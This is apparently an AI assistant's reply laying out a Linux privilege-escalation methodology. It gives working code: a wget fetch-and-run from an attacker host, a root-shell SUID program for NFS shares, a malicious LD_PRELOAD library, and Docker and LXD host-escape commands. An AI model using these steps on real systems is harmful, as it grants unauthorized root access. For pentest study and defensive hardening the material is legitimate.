Of course. Here is a more extensive and detailed overview of the Linux Privilege Escalation methodology, incorporating additional vectors and advanced techniques.

## Linux Privilege Escalation Methodology (Extended)

This guide expands on the core concepts with more advanced vectors, providing a comprehensive strategy for escalating privileges on a Linux system.

### The Core Checklist üó∫Ô∏è

This is your primary workflow. For any compromised user, systematically check these vectors.

1.  **Run an Automated Script**: Always start with **LinPEAS** (`linpeas.sh`). It's the fastest way to get a comprehensive overview of the system's security posture.
2.  **Check Low-Hanging Fruit**: Systematically check `sudo -l`, **SUID/SGID** binaries (cross-reference with GTFObins), and file **capabilities**. These are the most common entry points.
3.  **Investigate Services & Cron Jobs**: Are any services misconfigured? Are any cron jobs running scripts you can write to? Can you abuse **$PATH** or wildcards?
4.  **Hunt for Credentials & Sensitive Data**: Aggressively search the file system for passwords, private keys, API tokens, and sensitive information in logs or config files.
5.  **Check for Shared Resource Vulnerabilities**: Are there misconfigured **NFS** shares?
6.  **Look for Advanced Binary Exploits**: Can you hijack shared libraries with **LD\_PRELOAD** or abuse RPATH?
7.  **Check for Container Escapes**: Is the user in the `docker` or `lxd` group? This is often a direct path to root.
8.  **Identify Kernel/Recent Vulnerabilities**: Is the kernel or a system service vulnerable to a recently discovered, high-impact exploit (e.g., PwnKit, Dirty Pipe)?

## 1\. Initial Enumeration (Know Your System)

A thorough understanding of the machine is the foundation of any escalation attempt.

### Automated Scripts (The Best First Step)

These scripts automate the discovery of most vulnerabilities listed below.

```shell
# Download and run LinPEAS from your attacker machine
wget http://<attacker_ip>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt
```

### Manual Checks

```shell
# System & User Info
uname -a && cat /etc/os-release && ps aux && id && sudo -l

# Network, Services, and Cron Jobs
ss -tulpn && ls -la /etc/cron* && systemctl list-timers --all
```

-----

## 2\. Common Escalation Vectors

These are the most frequent and reliable paths to root.

### Sudo Rights & SUID/SGID Binaries

Always check GTFObins for any binary you find that can be run with elevated privileges.

```shell
# Check your sudo permissions
sudo -l

# Find SUID binaries (run as file owner, e.g., root)
find / -perm -u=s -type f 2>/dev/null
```

**--\> For any binary you find, check GTFObins: [https://gtfobins.github.io/](https://gtfobins.github.io/)**

### Capabilities

Capabilities provide granular permissions that can be exploited.

```shell
# Find files with capabilities set
getcap -r / 2>/dev/null
```

**--\> Check GTFObins for any abusable capabilities (e.g., `python3` with `cap_setuid`).**

-----

## 3\. Misconfigurations & Weak Permissions

### Writable Cron Jobs, PATH Abuse, and Wildcards

These vectors rely on scripts run by root that can be influenced by a low-privileged user. Use `pspy` to monitor processes in real-time to spot these opportunities.

### NFS Share Misconfigurations

The Network File System (NFS) can be misconfigured to allow a remote user to create files on the target system as root.

```shell
# On your attacker machine, check what shares are available
showmount -e <target_ip>

# On the target machine, check the NFS configuration
cat /etc/exports
```

If you see a share with the **`no_root_squash`** option, you can gain root. Mount the share on your attacker machine, create a C program with a SUID shell, compile it, and run it on the target.

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void){ setuid(0); setgid(0); system("/bin/bash -p"); }
```

```shell
# On your attacker machine after mounting the share to /mnt/nfs
gcc shell.c -o /mnt/nfs/shell
chmod +s /mnt/nfs/shell

# On the target machine
/path/to/share/shell
```

-----

## 4\. Advanced Binary & Library Exploitation

### Shared Library Hijacking (`LD_PRELOAD`)

If `sudo -l` shows that the `LD_PRELOAD` environment variable is preserved, you can force a program run by `sudo` to load a malicious shared library.

```c
// hijack.c - A malicious shared library
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash -p"); }
```

```shell
# Compile the malicious library
gcc -fPIC -shared -o hijack.so hijack.c -nostartfiles

# Run the program that preserves the variable with sudo
sudo LD_PRELOAD=$PWD/hijack.so /path/to/sudo/program
```

-----

## 5\. Container & Virtualization Escapes üê≥

Access to container management tools is often equivalent to root on the host system.

### Docker Socket Abuse

If your user is a member of the **`docker`** group, you can escape to the host.

```shell
# Check if you are in the docker group
id

# Run a privileged container and mount the host's root filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### LXD/LXC Privileged Group

Similarly, membership in the **`lxd`** group allows you to mount the host's filesystem into a privileged container.

```shell
# Check if you are in the lxd group
id

# Create a privileged container and mount the host's root directory
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh
```

-----

## 6\. Kernel & Recent Vulnerabilities (0-days) üí•

This is a powerful but often noisy and unstable method. Always check the system's kernel and service versions against recently disclosed vulnerabilities.

```shell
# Check kernel and OS version
uname -a && cat /etc/os-release
```

Famous examples include:

  * **Polkit's `pkexec` (CVE-2021-4034 "PwnKit")**: A memory corruption bug that provided instant local root on nearly all major Linux distributions.
  * **Dirty Pipe (CVE-2022-0847)**: A vulnerability in the Linux kernel that allowed overwriting data in arbitrary read-only files, leading to trivial privilege escalation.

Always search for public proof-of-concept exploits for these vulnerabilities on platforms like GitHub.
